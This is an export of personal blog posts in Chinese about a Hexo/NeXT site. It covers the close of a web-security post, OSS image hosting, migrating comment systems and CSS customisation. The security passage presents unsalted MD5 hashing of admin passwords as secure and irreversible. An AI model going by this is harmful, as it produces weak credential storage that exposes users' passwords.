char[32]; for (int i = 0; i &lt; 16; i++) &#123; byte temp = newBytes[i]; newStr[2 * i] = hexDigits[temp &gt;&gt;&gt; 4 &amp; 0xf]; newStr[2 * i + 1] = hexDigits[temp &amp; 0xf]; &#125; return new String(newStr); &#125; catch (NoSuchAlgorithmException e) &#123; return null; &#125; &#125; 通过在后台对数据库中，管理员的密码进行MD5加密然后存入加密后的字段进去，在前台通过加密前的字段输入后在后台进行方法验证，实现MD5加密登录。防止数据库的密码被暴露查询出来。加密后无法被反解密出来。 后台添加修改信息的字符检测同前台登录一样的检测方法，因为我只负责前台检测，如果黑客绕过了我的检测，就要进行后台对数据传过去的值进行检测，这时候就是后台人员的工作了。所以前后台都要进行这些字符检测，但是后台的责任要重一点，因为数据最终流向是在后台服务器端，前台只是初步防护而已。 验证码和滑块验证验证码字符验证目前验证码字符验证已经逐渐推出舞台，但是有一些专门这块验证服务的第三方平台，通过对验证码字符的不断改进和更新，对一些攻击者来说还是有防护作用，但是个人或企业网站还是用的一尘不变的验证方法的话，就很容易被攻击成功。很多初学者都在前台浏览器客户端用JS进行字符验证，很容易被破解跳过。好点的就在服务器进行检验，但是还是能被一些黑客经过长期的经验发明的一些工具破解。这里就提及一下12306所推出的图片验证，目前已经被很多人报道也是不安全的，攻击者可以直接将图片处理后丢入google、百度的识图接口，返回的数值让人惊讶。 居然能把第二张图识别为沙县小吃，我是觉得目前的人工智能的图像识别技术很厉害，所以要不了多久这种验证方式也会被淘汰，除非不断更新图片库。 滑块验证滑块验证和12306的图片识别验证目前算是比较安全的验证手段，滑动验证的核心并不是简单的拼接成功就可以过，所以也不是简单的算一下偏移量就能破解。滑动验证做的好的是通过采集你的滑动过程轨迹与服务器端的海量样本进行对比，区分人还是机器，用到了很多深度学习的技术，当然市面上也有一些滑动验证只是前端拼接就能过，大家还是要多多研究一下。 反正如果项目需要用到验证码这块，不能考虑只在客户端进行JS验证，客户端的JS验证有的前提下，还要把数据返回到后台来进行验证，这样可以大概率保证网站安全性，网站的攻防一直是持久的话题，没有绝对的安全也没有绝对的攻击。推荐大家多尝试网上的第三方服务商提供的验证服务，这样节省自己的精力来研究验证漏洞以及频繁的更新验证方法。 End在校期间第一次认识到web安全重要性，目前只是初步的认识，如果后面了解了更多相关的知识，会继续做补充。关于hexo搭建的博客的技术应该不会再出什么文章了，有需要了解其他的知识的，会有困难的可以联系我或下方留言，然后看情况是否整理为一篇文章来集中回答帮助其他人。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[解决博客图片存储——阿里云的OSS运用]]></title>
      <url>%2Fimg-oss%2F</url>
      <content type="text"><![CDATA[前言之前打算写一篇有关个人博客SEO优化的体验和一些自身体会，但是发现自己还没完全理解SEO的一些核心知识和原理，所以就等到以后再来写，毕竟我的百度权值还是0（笑…）。接下来讲解一下博客中用的图床——阿里云对象存储（Object Storage Service，简称OSS），虽然目前大家用的比较多的是七牛云之类的，但是因为我个人原因我还是选择了阿里云，后面我会简单说明下原因。 原因github pages容量受限之前看过一些别人的github博客，发现只要文章多的人，基本上都用到了图床，原因有很多，毕竟github免费给你用，肯定会限制你的可使用空间的，从长远来看，你的图片资源肯定不能放到别人服务器上，大家还是要理解下。 图床访问速度快一般用图床的，都是图片之类的静态文件非常多，把图片存储到第三方CDN，除了加快图片访问速速，还可以降低你服务器的存储压力，后续网站迁移扩容就不受影响了。 前瞻性虽然我们目前做的是一个博客的小网站，但是以后无论是自己的博客还是实际的项目，都可以用图片来提供外链，方便管理，如果你的网站访问量很高啊，一天几十万几百万啊，我的天啊，这时候你考虑的就不是服务器空间够不够大，而是惊人的并发数啊，光是请求html文件（或其他）的链接就处理不过来了，哪还有多余的资源去读取图片啊，索性就把图片存另一个服务器吧，给主服务器减轻压力啊，于是图床诞生了。 个人原因本人在阿里云的外网上买了几个域名，索性就用了他们的产品，毕竟平时支付宝用的多吧，我看了一下阿里云的OSS服务，虽然性价比比不上七牛云，但是我个人来说就够用了。 对比分析存储空间费用阿里云 ： 0-5GB(含)部分 免费 只限香港地区七牛云 ： 0 GB 至 10 GB 免费 流量费用阿里云 ：0-5GB(含)部分 免费七牛云 ：HTTP 下载流量 第 0 GB 至 10 GB 国内免费 国外免费HTTPS 下载流量 第 0 GB 至 10 TB (含) 0.36 元/GB 0.58 元/GB暂且可以不用考虑这个HTTPS流量，因为我博客基本都用到的是HTTP下载流量） 小结所以就很尴尬，我居然会选择阿里云来做我的图床（我今年3月10日才正式上限，3月完已经跑了我6G多的流出带宽，为此我自己还交了几块钱，虽然不多，但是交的心甘情愿吧，毕竟阿里爸爸这个大公司，不会让我上传的图片出现一些问题，安全和速度绝对有保障）最尴尬的是：存储容量居然目前用了不到5M（如果不传一些视频的话，全是压缩后的图片的话，一般占用不到多少，而且我也不敢放视频上去做外链，这样我的带宽按目前情况要上百G）。后面给大家分享一个压缩图片的网站，之前的我很天真，想着刚开博客，跑不了多少流量出去，直到5G用完那一刻，我才意识到压缩图片的重要性。 使用OSS这里我拿的阿里云OSS来讲，基本上每个地方的都类似。 进入控制台选择对象存储OSS进入到对应面板新建一个Bucket注意：我是用的阿里云，如果要跟我用一样的话，所属区域要选香港。不然可能产生格外的其他费用。创建完Bucket对象后，就可以上传本地需要存储文件然后就可以获取这个图片的地址，复制后在浏览器里输入试试能不能正常显示 图片链接地址优化其实这个也没什么，但是一些图片的外链和title好像是会提高搜索引擎的蜘蛛爬取。比如在用MD写文章的时候引入图片的title最好这样 1![阿里云-OSS运用](http://img.cduyzh.com/images/aliyun-oss5.png) 细心的人可能会发现我的图片地址很简洁，这样就会让百度和其他搜索引擎的蜘蛛更快的来爬去你的图片进而检录上去。要把图片地址改为这样的要如何来实现，其实不难。把它的地址解析到你想要的地址上，前提要先去域名解析那设置好，如果用的阿里云还可以自动设置。然后查看我自己控制台的cduyzh.com这个域名，在域名解析那我发现多了个这个，当然你也可以自己来设置的。这样后在你添加图片后，你就可以把前面那一长段换成自己想要的域名地址链接，无论是他人下载你的图片，或者搜索引擎来检索你的图片，都会方便许多。 图片在线压缩网站地址：图片在线压缩网站这个网站基本上会把你的照片压缩50%以上，所以很好用。但是一次最多上传20张，最大5MB封底，如果比较多或者大的照片，只能分批次来处理压缩了。 OSS管理工具OSS管理工具这个软件是阿里云官方给的OSS管理工具，如果嫌每次上网页上传麻烦，可以试试这个。 如果照片名字重复上传，会自动覆盖掉上一次已经上传的，保留最后一次上传的。 这个功能可以说比较实用，因为有些时候，你会忘记去压缩图片，然后你文章什么的都发了，不可能把以前的删了重新上传，这样把上传的图片下载下来再去压缩，最后直接丢进来覆盖上传很省事。因为我自己每次上传文章后，把文章用到的一些图片丢到云后，我本地要清空了，节约一些磁盘空间（大部分图片为手动截图的）。 End虽然一个博客用到图床还不能体会到图床的一些强大之处，但是越往后就会越深入，做一些网站可能用到的静态过多后，可能会考虑用图床来解决服务器存储容量问题，以及一个网站日均访问量很大，图片的GET次数很大的时候，可以用图床来缓解请求压力，不至于影响用户体验。希望大家能了解到可以用图床来处理一些静态文件的加载。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[多说评论关闭服务后迁移到网易云跟帖]]></title>
      <url>%2Fhexo-settings-7%2F</url>
      <content type="text"><![CDATA[前言2017年3月21日多说宣布将于6月1日前关闭旗下的评论服务，意味着目前使用多说的站点的评论信息必须全部迁移到其他第三方评论系统里，有些人可能正在搭建多说评论，也有搭建好了的，正准备考虑迁移到哪去，而我在分析了几个第三方评论平台后，选择了使用网易云跟帖。至于为什么，请继续往下阅读。 关于第三方评论插件我是搭建博客的时候才接触到多说的，多说怎么样，我相信对于一些使用过其他的第三方评论系统的人心里都知道，我在了解过目前国内主流的畅言、来比力、网易云跟帖等后，得出了一个结论。 其实我只去用过畅言和来比力，最后来总结多说。 畅言畅言背后是属于搜狐这个大公司的，有着这种大背景下，畅言的一些安全和保密性，以及垃圾评论的减少得到保证，而且不会挂掉，很稳定。 但是畅言有一点原因导致了我放弃了它 那就是它必须要求所使用的站点完成备案，因为我的网站是托管在的github pages上的属于国外服务器，根本没办法去备案的，而且我也不打算自己去租用一个云服务器或云主机来托管博客。所以我就放弃了它，不然它会是目前多说倒闭后的最好选择。 来必力 来必力是韩国的，目前该公司把业务做到了国外，支持英语、中文、韩语。 先不说其他的，目前韩国在部署萨德，说什么我都不会去用韩国人的东西的！ 撇开政治因素来谈，它的UI设计和后台管理也比较不错，数据可视化用到了图标来展示，所以有付费和免费两个版本，博客只需要用免费的就行了，当然付费的效果主要体现在数据分析上，还可以取消掉免费版未来所带来的广告。 网易云跟帖它是16年6月份才推出的一个新产品，选择这个评论系统有一种情节在里面，因为我本人非常爱用网易云音乐来听歌，所以我本着支持网易云音乐的原则，也来支持这个产品.尽管这个产品目前有很多的不足，不过背后毕竟是网易这个大公司，相信日后会越来越好的。我在后面会详细介绍这个的。 多说重点来了多说倒闭的原因，我暂且不谈，每个人的看法不一样，多说的各方面功能都算的上完善，有很多组件可用，最近评论、访客，最热文章，都能有效提高博客的互动性。 我觉得多说唯一的缺陷就是没有采取有效的盈利方式。 多说作为国内第一下载量的第三方评论插件提供方，它的倒闭肯定导致许多博客主焦头烂额，在这里我有几点建议。 选择一个稳定的大公司第三方评论插件 尽早导出现有的评论数据，并在新的评论系统后台导入 刚搭建博客的新人小白，可以选择观望2个月后看是否多说有补救措施继续运营 爱折腾的可以考虑和我一样投奔网易云跟帖怀抱（笑….） 如果是用hexo开发的博客，建议时刻关注你使用的主题的官方网页，以及源项目的github仓库，看看主题作者和大家怎么解决多说评论问题 小白建议选择新评论系统的时候，从官方主题文档中给出的已支持的插件中选择 原有数据导出这里以多说评论系统导出数据为例，其他的可以类比。 后台管理导出数据进入多说的后台管理系统，从工具——导出数据 一定要记得勾选包含文章数据和包含评论数据 导出后就是一个json文件，用于后面上传到新评论系统内的。 导入以往数据以网易云跟帖操作为例，注册好帐号后，进入后台管理，绑定好自己的站点网址，在数据统计——数据管理——数据导入中，上传之前导出的文件进去，就完成了 配置网易云跟帖的后台里可以进行一些基本设置，我这里就跳过，主要说下hexo下next主题的配置。 因为最新版的主题集合了网易云跟帖所以操作起来简便 获取Product Key 登陆 网易云跟帖 获取你的 Product Key。 编辑 主题配置文件， 编辑 gentie_productKey 字段，设置如下： gentie_productKey: #your-gentie-product-key 配置文件修改请注意，您在云跟帖管理后台设置的域名必须跟您站点的域名一致。在本地测试时，需要做两步骤前置设定： 12修改 hosts 文件，将您域名的请求指向本地。例如：127.0.0.1 notes.example.com修改 Hexo 监听的端口为 80：hexo s --debug -p 80 1我的host文件路径C:\Windows\System32\drivers\etc 测试完成后请将 hosts 文件中的域名映射删除。hosts文件中记录写法一般为“tab键”→“ip地址”→“tab键”→“域名”→“回车”（最后的回车最好加上。）如图，我将百度域名解析到本地。 因为我的80端口被apache服务器占用了，而且我不想去改，其实这个也不用怎么测试的，所以大家完全可以上传到线上自己来看。 细节优化评论系统出来了，它不像多说一样，对博客进行了一些优化，比如首页的文章摘要信息里，没有了以前多说的评论数了和对应的评论icon图标,但在文章详情里它又出来了，信息的人可能发现了，样式很丑具体如下：我通过使用一个伪类的CSS样式添加了“评论”二字让用户体验提高。相关源码在最后。 注意事项如果你的评论系统没有加载成功，请试着看如下几点要求和注意点。 关闭多说评论系统或其他的第三方评论系统 检查以前配置多说的参数将其注视掉或设为false等，因为next主题会优先检测多说评论是否支持 网易云站点网址是否填写正确，我之前填写的地址为www.cduyzh.com，但我在域名解析那解析的是两个地方，cduyzh.com和www.cduyzh.com，导致了我评论系统加载出现问题，如果在cduyzh.com内的新评论在www.cduyzh.com是看不到的，所以大家注意下，可以把域名解析中的cduyzh.com暂停使用。 网易云跟帖的小功能插件比较少，其中的热门新闻模块，我按照之前加载多说热门文章的方法添加了对应的代码进去，发现两者不能很好的兼容会出现问题，导致我评论加载不出来，只加载出来了热门文章。 最后一点希望大家把自己的问题反馈出来，大家可以相互交流，欢迎大神给我指出哪里出现了问题。 福利经过折腾终于迁移到了网易云跟帖，因为本人在添加网易云的热门文章时，出现了一些未知BUG，目前无法在保证有评论的情况下有热门文章，虽然这个小功能看似不是很重要，但是对于强迫症来说有点不爽，希望大神指点。 评论样式开源之前我出过文章讲解多说的样式优化，现在搬到了网易云跟帖，我当时也对它做了一些优化，在查看评论的样式后，我发现网易云跟帖这方面优化做的还不错，用户头像已经设置为原型了，只是没有添加旋转的效果，我把之前的多说下的样式引入了一部分进来，然后自己设置了一些其他样式。现贴出具体的样式代码，和以前一样，重写覆盖在D:\hexo\blog\themes\next\source\css\_custom\custom.styl修改代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586//网易云跟帖评论样式增添.post-comments-count a::before &#123; content: &quot;评论&quot;;&#125;#yun-tie-sdk-wrap .input-box .tie-submit-row .tie-submit-btn &#123; background-color: #649ab6;&#125;#yun-tie-sdk-wrap .input-box .tie-submit-row .tie-submit-btn:hover &#123; background-color: #4c618f;&#125;.tie-empty-tip &#123; display: none;&#125;//即将发布消息人样式#yun-tie-sdk-wrap .input-box .tie-submit-row .user-info img:hover &#123;box-shadow: 0 0 10px #fff;rgba(255, 255, 255, .6) inset 0 0 20px rgba(255, 255, 255, 1);-webkit-box-shadow: 0 0 10px #fff;rgba(255, 255, 255, .6) inset 0 0 20px rgba(255, 255, 255, 1);transform: rotateZ(360deg); -webkit-transform: rotateZ(360deg);-moz-transform: rotateZ(360deg);&#125;#yun-tie-sdk-wrap .input-box .tie-submit-row .user-info img &#123;width: 32px;height: 32px;border-radius: 50%;margin: 4px 10px 4px 8px;padding: 0;cursor: pointer;box-shadow: inset 0 -1px 0 #3333sf; /*设置图像阴影效果*/-webkit-box-shadow: inset 0 -1px 0 #3333sf;-webkit-transition: 0.4s;-webkit-transition: -webkit-transform 0.4s ease-out;transition: transform 0.4s ease-out; /*变化时间设置为0.4秒(变化动作即为下面的图像旋转360读）*/-moz-transition: -moz-transform 0.4s ease-out;&#125;//评论框内其他人样式#yun-tie-sdk-wrap .single-tie .photo img:hover &#123;box-shadow: 0 0 10px #fff;rgba(255, 255, 255, .6) inset 0 0 20px rgba(255, 255, 255, 1);-webkit-box-shadow: 0 0 10px #fff;rgba(255, 255, 255, .6) inset 0 0 20px rgba(255, 255, 255, 1);transform: rotateZ(360deg); -webkit-transform: rotateZ(360deg);-moz-transform: rotateZ(360deg);&#125;#yun-tie-sdk-wrap .single-tie .photo img &#123;width: 42px;height: 42px;border-radius: 50%;padding: 0;cursor: pointer;box-shadow: inset 0 -1px 0 #3333sf; /*设置图像阴影效果*/-webkit-box-shadow: inset 0 -1px 0 #3333sf;-webkit-transition: 0.4s;-webkit-transition: -webkit-transform 0.4s ease-out;transition: transform 0.4s ease-out; /*变化时间设置为0.4秒(变化动作即为下面的图像旋转360读）*/-moz-transition: -moz-transform 0.4s ease-out;&#125;.name-nick:hover &#123; border-left: 14px solid #3264b4;&#125;.name-desp:hover &#123; border-left: 14px solid #3264b4;&#125;#yun-tie-sdk-wrap .single-tie .tie-author .name-nick&#123; cursor: pointer; transition: border-width 0.3s linear 0.1s, color 0.2s linear 0.3s;&#125;#yun-tie-sdk-wrap .single-tie .tie-author .name-desp &#123; cursor: pointer; transition: border-width 0.3s linear 0.1s, color 0.2s linear 0.3s;&#125;.tie-time:hover &#123; border-right: 14px solid #3264b4;&#125;#yun-tie-sdk-wrap .single-tie .tie-time &#123; transition: border-width 0.3s linear 0.1s, color 0.2s linear 0.3s; cursor: pointer;&#125; End从多说评论系统，到优化的它的样式，优化UA（评论用户操作系统和浏览器信息）、最近访客，以及用户头像设置等，期间参考了不少其他人的博客和文章，然后在动手去修改，感概很多，多说是我心目中的国内第一的第三方评论系统，居然在前几天宣布了即将关闭服务，让我很是失落。希望在6月1日在众多独立站长的支持下能走出困境，找到属于自己发展的盈利模式以此来继续经营下去。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[多说插件最近访客样式问题和解决方法]]></title>
      <url>%2Fhexo-settings-6%2F</url>
      <content type="text"><![CDATA[前言简单的讲诉下如何添加最近游客，以及如何设置它到页面想要的位置，和一些样式修改。其实这个功能不是特别重要，实现起来也不是很困难，步骤很少，一下就能部署成功。 准备其实这个代码很就简单，需要增加代码的如下： 1234&lt;ulclass=&quot;ds-recent-visitors&quot; data-num-items=&quot;26&quot; data-avatar-size=&quot;42&quot; &gt;&lt;/ul&gt; 讲解一下最后两个参数12data-num-items=&quot;26&quot; //代表显示访客人数，建议为26，大家可以自行更改，因为我根据我设置的头像大小发现在我笔记本上设置为26刚好是两排，但在大点的屏幕上的话，就是1排半多点的样子，不到两排反正。data-avatar-size=&quot;42&quot; //这个就是设置头像大小了 添加位置文章模版结尾处添加这个位置确实可以自己想添加到哪，一般人可能会在文章末尾添加这一段，那么为了避免重复操作，大家可以在生成page的模版文件里在末尾自动加上这段代码。 我的对应文件路径如下D:\hexo\blog\scaffolds\page.md 完整修改后如下： 12345678910---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;tags:categories:---### 最近访客&lt;ul class=&quot;ds-recent-visitors&quot; data-num-items=&quot;26&quot; data-avatar-size=&quot;42&quot; &gt;&lt;/ul&gt; 修改样式发现样式问题现在可以在本地测试看看，已经有了效果了，但是头像是竖着排的，因为ds-recent-visitors .ds-avatar { display: inline;}。 解决思路我试着去改了下display的属性，用了重写覆盖的方法，但是重新加载后发现，我重写的样式没有覆盖掉原先的，那就应该是我重写的样式优先级没有它引入的高，可能引入的样式在我重写之后，所以我被覆盖掉了。那现在我又懒得去看源码分析CSS加载的先手顺序，所以有了一个网上流传的改法。 具体解决通过设置float: left属性来解决是可行的，因为原先的CSS里没有设置这个值，所以重写有效。具体代码如下： 添加路径D:\hexo\blog\themes\next\source\css_custom\custom.styl123#ds-recent-visitors .ds-avatar &#123; float: left;&#125; 样式问题设置了又有点样式问题如图：这个问题只有在文章最下面设置了一些悬赏或一些自定义话的时候才会出现这种问题，如果都没有设置的话，可能会出现你对文章创建的标签比如#hexo也在浮动。 解决方法具体原理我就不多说了，直接放上解决方法：添加一个这个样式到 D:\hexo\blog\themes\next\source\css_custom\custom.styl 12345#ds-recent-visitors &#123; width: 100%; height: 100px; padding-inline-start: 0px;&#125; 其实width可以不要，主要是给个高度，把ul这个容器撑起来，才能把后面的挤下去，ul标签是个块级元素，之所以加个是为了调成了样式方便，最后一个padding-inline-start: 0px;是为了重写padding-inline-start: 40px;这个CSS，因为浏览器会自动给ul加这个默认样式，我这里就改为0了，为了布局美观。 End到这里样式基本修改完毕了。有问题欢迎下方评论交流。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hexo下Next主题使用多说评论插件样式优化]]></title>
      <url>%2Fhexo-settings-5%2F</url>
      <content type="text"><![CDATA[前言因为Next主题最新版也结合了多说了一些插件，只需要在主题配置文件里设置参数就可以看到效果，但我发现样式还不够好看，就从几个方面来进行了优化。也会讲解如何使用多说的评论、分享、热评文章功能。 启用多说评论功能 使用多说前需要先在 多说 创建一个站点。具体步骤如下： 准备1·登录后在首页选择 “我要安装”。 2·创建站点，填写表单。多说域名 这一栏填写的即是你的 duoshuo_shortname，如图：3·创建站点完成后在 主题配置文件 中新增 duoshuo_shortname 字段，值设置成上一步中的值。 修改或添加代码修改主题配置文件代码 12# Duoshuo ShortNameduoshuo_shortname: cduyzh //改为你自己的 ### 启用ua这个是为了显示评论者使用的系统和浏览器属性，以及是否显示博主的昵称信息。修改代码如下12345duoshuo_info: ua_enable: true admin_enable: true user_id: 6224774254659896065 admin_nickname: 水美眉（博主） 获取user_id登录你的多说账户信息主页点击你的名字进入的页面后，地址最后有个ID就是它了！！！ 启用多说分享功能修改或添加代码修改主题配置文件代码12# Shareduoshuo_share: true 启用多说热评文章功能修改或添加代码12# 多说热评文章 true 或者 falseduoshuo_hotartical: true 修改评论头像样式评论模块样式123456789101112131415161718192021222324252627282930/*隐藏多说底部版权*/#ds-thread #ds-reset .ds-powered-by &#123;display: none;&#125;#ds-reset .ds-avatar img:hover,#ds-recent-visitors .ds-avatar img:hover &#123;/*设置鼠标悬浮在头像时的CSS样式*/ box-shadow: 0 0 10px #fff;rgba(255, 255, 255, .6), inset 0 0 20px rgba(255, 255, 255, 1);-webkit-box-shadow: 0 0 10px #fff;rgba(255, 255, 255, .6), inset 0 0 20px rgba(255, 255, 255, 1);transform: rotateZ(360deg); /*图像旋转360度*/-webkit-transform: rotateZ(360deg);-moz-transform: rotateZ(360deg);&#125;#ds-reset .ds-avatar img,#ds-recent-visitors .ds-avatar img &#123;width: 54px;height: 54px; /*设置图像的长和宽，这里要根据自己的评论框情况更改*/border-radius: 27px; /*设置图像圆角效果,在这里我直接设置了超过width/2的像素，即为圆形了*/-webkit-border-radius: 27px; /*圆角效果：兼容webkit浏览器*/-moz-border-radius: 27px;box-shadow: inset 0 -1px 0 #3333sf; /*设置图像阴影效果*/-webkit-box-shadow: inset 0 -1px 0 #3333sf;-webkit-transition: 0.4s;-webkit-transition: -webkit-transform 0.4s ease-out;transition: transform 0.4s ease-out; /*变化时间设置为0.4秒(变化动作即为下面的图像旋转360读）*/-moz-transition: -moz-transform 0.4s ease-out;&#125; 我把这段代码放在了多说的后台设置中的自定义CSS里的。 修改ua信息样式动机 主要看别人博客里，别人的样式有这个，然后用了他们的方法比如引入CSS什么的，发现没用，后来发现必须要用到JS获取你的浏览器版本信息和操作系统信息，给他加上对应的标签的样式，然后通过你自己定义的CSS样式来实现对ua信息样式的美化因为默认的ua样式太丑了不美观，在此我也不贴图了。大家自己第一次启用这个功能的时候能感受得到。 修改代码博主的next为最新的5.1.0版本不知道以前版本的情况，在我的next主题里，分析源码的时候找到了一个关于多说的文件， 1我的路径为 D:\hexo\blog\themes\next\layout\_scripts\third-party\comments\duoshuo.swig 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&#123;% if (theme.duoshuo and theme.duoshuo.shortname) or theme.duoshuo_shortname %&#125; &#123;% if theme.duoshuo %&#125; &#123;% set duoshuo_shortname = theme.duoshuo.shortname %&#125; &#123;% else %&#125; &#123;% set duoshuo_shortname = theme.duoshuo_shortname %&#125; &#123;% endif %&#125; &lt;script type=&quot;text/javascript&quot;&gt; var duoshuoQuery = &#123;short_name:&quot;&#123;&#123;duoshuo_shortname&#125;&#125;&quot;&#125;; (function() &#123; var ds = document.createElement(&apos;script&apos;); ds.type = &apos;text/javascript&apos;;ds.async = true; ds.id = &apos;duoshuo-script&apos;; ds.src = (document.location.protocol == &apos;https:&apos; ? &apos;https:&apos; : &apos;http:&apos;) + &apos;//static.duoshuo.com/embed.js&apos;; ds.charset = &apos;UTF-8&apos;; (document.getElementsByTagName(&apos;head&apos;)[0] || document.getElementsByTagName(&apos;body&apos;)[0]).appendChild(ds); &#125;)(); &lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; if (typeof DUOSHUO !== &apos;undefined&apos;)hookDUOSHUO_tp(); else $(&apos;[src=&quot;http://static.duoshuo.com/embed.js&quot;]&apos;)[0].onload=hookDUOSHUO_tp; var hookDUOSHUO_bl=false; function hookDUOSHUO_tp()&#123; if(hookDUOSHUO_bl)return; else hookDUOSHUO_bl=true; var _D_post=DUOSHUO.templates.post; DUOSHUO.templates.post=function (e,t)&#123; var rs=_D_post(e,t); if(e.agent&amp;&amp;/^Mozilla/.test(e.agent))rs=rs.replace(/&lt;\/div&gt;&lt;p&gt;/,show_ua(e.agent)+&apos;&lt;/div&gt;&lt;p&gt;&apos;); return rs; &#125; &#125; function show_ua(string)&#123; $.ua.set(string); var sua=$.ua; if(sua.os.version==&apos;x86_64&apos;)sua.os.version=&apos;x64&apos;; return &apos;&lt;span class=&quot;this_ua browser &apos;+sua.browser.name+&apos;&quot;&gt;&apos;+sua.browser.name+&apos; | &apos;+sua.browser.version+&apos;&lt;/span&gt;&apos;+&apos;&lt;span class=&quot;this_ua platform &apos;+sua.os.name+&apos;&quot;&gt;&apos;+sua.os.name+&apos; &apos;+sua.os.version+&apos;&lt;/span&gt;&apos;; &#125; &lt;/script&gt; &#123;% if theme.duoshuo_info.ua_enable %&#125; &#123;% if theme.duoshuo_info.admin_enable %&#125; &#123;% set ua_parser_internal = url_for(theme.vendors._internal) + &apos;/ua-parser-js/dist/ua-parser.min.js?v=0.7.9&apos; %&#125; &lt;script src=&quot;&#123;&#123; theme.vendors.ua_parser | default(ua_parser_internal) &#125;&#125;&quot;&gt;&lt;/script&gt; &lt;script src=&quot;&#123;&#123; url_for(theme.js) &#125;&#125;/src/hook-duoshuo.js?v=&#123;&#123; theme.version &#125;&#125;&quot;&gt;&lt;/script&gt; &#123;% else %&#125; &#123;% set ua_parser_internal = url_for(theme.vendors._internal) + &apos;/ua-parser-js/dist/ua-parser.min.js?v=0.7.9&apos; %&#125; &lt;script src=&quot;&#123;&#123; theme.vendors.ua_parser | default(ua_parser_internal) &#125;&#125;&quot;&gt;&lt;/script&gt; &lt;script src=&quot;&#123;&#123; url_for(theme.js) &#125;&#125;/src/hook-duoshuo.js&quot;&gt;&lt;/script&gt; &#123;% endif %&#125;&#123;% endif %&#125; 解读代码这段代码是我自己的修改后的，大家对照着自己看，主要是添加了一段代码而已。里面有2个script标签里闭合的是JS函数，其他的script标签都是引用JS文件，大家自己去看。第一个就是多说评论系统默认的JS添加代码，多说官网有，这段代码必须要用。我这是集成了的所以没有改动。第二个是我添加的，主要实现用JS获取用户的浏览器类型和操作系统，并把这些信息添加到标签内和加入对应的CSS样式名，后面就通过对CSS样式进行优化就能达到如下效果顺便贴出我自己对UA写的的CSS样式 123456789101112131415161718//多说评论样式.theme-next #ds-reset .duoshuo-ua-platform, .theme-next #ds-reset .duoshuo-ua-browser &#123; color: #fff;&#125;.duoshuo-ua-browser&#123;background-color: #ccc!important;border-radius: 4px;padding: 0 5px!important;margin: 0 1px!important;border: 1px solid #BBB!important;color: #fff;&#125;.duoshuo-ua-platform&#123;background-color: #ccc!important;border-radius: 4px;padding: 0 5px!important;margin: 0 1px!important;border: 1px solid #BBB!important;color: #fff;&#125;.duoshuo-ua-platform-windows&#123;background-color: #39b3d7!important;border-color: #46b8da!important;&#125;.duoshuo-ua-platform-linux &#123;background-color: #3A3A3A!important;border-color: #1F1F1F!important;&#125;.duoshuo-ua-platform-android &#123;background-color: #00C47D!important;border-color: #01B171!important;&#125;.duoshuo-ua-platform-ios&#123;background-color: #ccc!important;border-color: #ccc!important;&#125;.duoshuo-ua-browser-chrome&#123;background-color: #5cb85c!important;border-color: #4cae4c!important;&#125;.duoshuo-ua-browser-firefox&#123;background-color: #f0ad4e!important;border-color: #eea236!important;&#125;.duoshuo-ua-browser-ie&#123;background-color: #428bca!important;border-color: #357ebd!important;&#125;.duoshuo-ua-browser-opera&#123;background-color: #d9534f!important;border-color: #d43f3a!important;&#125;.duoshuo-ua-browser-mobile safari&#123;background-color: #ccc!important;border-color: #ccc!important;&#125; 这段代码其实一看是没有对IOS系统和对应的safri浏览器进行CSS样式的编写，大家自己可以去定义，如果不定义有一个默认样式，会对这些无法识别的系统和浏览器有样式效果，就是灰色的背景而已。 End最后有什么不懂的，或者一些没讲到的，欢迎在下面评论，因为目前2017年相关的hexo下next主题教程几乎没有，所以为了大家少走弯路，希望多提出意见。 关于这个next主题的优化，基本上算是讲完了，如果有网友有其他需求讲解可以私下找我。我后面会出的有关文章类型，大概方向为：网站seo优化——网站收录心得、站点地图使用、爬虫协议等简单介绍和使用网站性能优化——用OSS对象存储来放图片等]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[2017年最新基于hexo搭建个人免费博客——自定义页面样式二]]></title>
      <url>%2Fhexo-settings-4%2F</url>
      <content type="text"><![CDATA[前言本篇文章继续讲解一些hexo下next主题博客样式的修改。主要内容为修改首页文章摘要样式，文章详情样式，以及文章阅读次数的统计深入讲解，酷炫的博客背景，在首页菜单里添加的独立的标签页，文章结尾的模版样式修改。暂时想到了这么多，欢迎大家提出新的东西，等后面有空了再讲新东西。 首页文章摘要样式修改准备假设看这篇文章的人是没有前端样式调试基础的，建议去看我上一篇文章——，看完后再继续看这篇。 传送门：2017年最新基于hexo搭建个人免费博客——自定义页面样式一 http://www.cduyzh.com/hexo-settings-3/ 查看对应样式通过浏览器的开发者工具可以查看到首页文章摘要对应的CSS可以看到header标签内为文章的头部的样式，大家可以进行一些修改，但是基本没什么需要改动的，大家可以自己DIY， 给文章首页摘要添加阴影效果大家看下箭头，修改对应的CSS样式，进行重写覆盖，修改的文件路径如下（以我自己的为例）： 1D:\hexo\blog\themes\next\source\css\_custom\custom.styl 修改代码如下123456789// Custom styles.//首页文章阴影样式.post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 14px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 14px rgba(202, 203, 204, .5);&#125; 阅读文章按钮样式修改主要为三个CSS样式的修改 123.post-button .btn.post-button .btn a.btn:hover, .post-button .btn:hover 最后一个为伪类，有时候查找元素的时候不能第一时间看到，多抓取几次。 也可以自己在本地编辑器测试修改.btn:hover, .post-button .btn:hover样式下的属性，测试显示效果就行。默认主题下把鼠标移入按钮时的样式中，按钮下方有个阴影，是主题自带的，如果不想要可以添加对应的CSS样式border:none来取消这效果，然后调整一下圆角值，居中设置，还有颜色的变化，大家自己参考下我之前发的样式表，或自己测试。 文章详情样式修改文章详情头部样式这个样式的修改和前面首页那个的样式基本一致，所以此处跳过，但是说一点图中框内的图标元素更改CSS样式是无法更改的，我更改了字数统计和阅读市场的ICON，具体做法大家可以看我以前写过的一篇文章，要在源码中更改CSS的值。 2017年最新基于hexo搭建个人免费博客——基本设置和了解http://www.cduyzh.com/hexo-settings-2/ 